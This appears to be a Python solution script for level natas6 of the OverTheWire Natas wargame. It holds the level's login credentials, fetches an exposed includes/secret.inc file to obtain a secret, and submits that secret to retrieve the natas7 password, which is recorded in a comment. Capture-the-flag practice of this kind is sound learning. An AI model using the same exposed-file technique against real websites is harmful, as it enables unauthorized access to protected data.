import requests,re


username="natas6"
password="aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url=str("http://%s.natas.labs.overthewire.org/includes/secret.inc" %username)

r=requests.post(url,auth=(username,password))
print(r.text)
#<?
#secret = "FOEIUWGHFEEUHOFUOIU";
#?>
url=str("http://%s.natas.labs.overthewire.org/" %username)

r=requests.post(url,auth=(username,password),data={'secret':'FOEIUWGHFEEUHOFUOIU','submit':'submit'})
print(r.text)

#Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9


